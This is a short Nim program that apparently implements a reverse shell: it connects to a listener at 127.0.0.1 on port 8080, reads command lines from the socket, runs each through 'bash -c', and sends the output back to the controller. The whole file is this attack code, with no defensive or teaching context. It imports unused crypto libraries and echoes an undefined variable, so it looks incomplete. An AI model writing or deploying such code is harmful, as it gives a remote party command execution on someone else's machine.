import osproc
import net
import nimcrypto, base64

proc toByteSeq*(str: string): seq[byte] {.inline.} =
  @(str.toOpenArrayByte(0, str.high))

var
  Lip = "127.0.0.1"
  Lport = Port(8080)
  socket = newSocket()

try:
  socket.connect(Lip, Lport)
  echo data

  while true:
    let cmd = socket.recvLine()
    if cmd == "exit":
      break
    let result = execProcess("bash -c " & cmd)
    socket.send(result)
except:
  socket.close
